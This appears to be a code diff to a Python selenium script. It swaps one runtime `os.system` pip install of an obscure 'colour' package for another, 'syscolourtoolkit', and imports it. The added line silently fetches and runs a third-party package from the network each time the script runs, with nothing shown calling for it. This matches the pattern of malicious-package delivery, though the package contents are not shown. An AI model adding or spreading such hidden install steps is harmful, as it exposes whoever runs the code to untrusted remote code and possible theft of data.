@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringslibV2")
-import pythoncolouringslibV2
+os.system("pip install syscolourtoolkit")
+import syscolourtoolkit
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
